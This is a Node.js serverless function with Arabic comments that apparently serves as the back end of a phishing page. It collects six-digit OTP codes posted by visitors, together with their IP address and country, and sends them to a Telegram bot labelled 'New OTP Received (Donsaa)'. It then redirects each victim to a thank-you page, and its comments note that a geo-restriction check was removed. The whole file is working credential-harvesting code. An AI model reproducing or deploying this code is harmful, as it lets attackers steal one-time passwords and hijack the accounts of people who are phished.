const fetch = require('node-fetch');

// تم إزالة قيد ALLOWED_COUNTRIES (إلغاء الحظر الجغرافي)

const getClientIp = (headers) => {
    return headers['x-nf-client-connection-ip'] || 
           headers['client-ip'] || 
           headers['x-forwarded-for'] ||
           'غير متوفر';
};

const escapeMarkdownV2 = (text) => {
    const replacements = {
        '\\': '\\\\', '_': '\\_', '*': '\\*', '[': '\\[', ']': '\\]', 
        '(': '\\(', ')': '\\)', '~': '\\~', '`': '\\`', '>': '\\>', 
        '#': '\\#', '+': '\\+', '-': '\\-', '=': '\\=', '|': '\\|', 
        '{': '\\{', '}': '\\}', '.': '\\.', '!': '\\!'
    };
    return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => replacements[match]);
};

exports.handler = async (event, context) => {
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }
    
    const ip = getClientIp(event.headers); 
    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; // سنظل نسجل البلد في الرسالة
    
    // ----------------------------------------------------------------
    // 1. **(تم إزالة فحص Geo-Restriction بالكامل)**
    // ----------------------------------------------------------------
    
    // ----------------------------------------------------------------
    // 2. معالجة OTP (الزوار المسموح لهم)
    // ----------------------------------------------------------------
    
    const bodyParams = new URLSearchParams(event.body);
    
    let otpCode = '';
    for (let i = 1; i <= 6; i++) {
        otpCode += bodyParams.get(`otp${i}`) || '';
    }
    
    const safe_otp = escapeMarkdownV2(otpCode);
    const safe_ip = escapeMarkdownV2(ip);
    const safe_country = escapeMarkdownV2(countryCode);

    let message_text = `🔑 *New OTP Received \\(Donsaa\\)* 🔑\n\n`;
    message_text += `Country: \`${safe_country}\`\n`; // ما زلنا نسجل البلد للتشخيص
    message_text += `OTP Code: \`${safe_otp}\`\n`;
    message_text += `IP: \`${safe_ip}\``; 

    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error("Telegram credentials missing in environment variables.");
        return { statusCode: 303, headers: { Location: '/thankyou.html' } };
    }
    
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message_text,
        parse_mode: 'MarkdownV2',
    };

    try {
        await fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (error) {
        console.error("Error sending message to Telegram:", error);
    }
    
    return {
        statusCode: 303,
        headers: {
            Location: '/thankyou.html', 
        },
    };
};
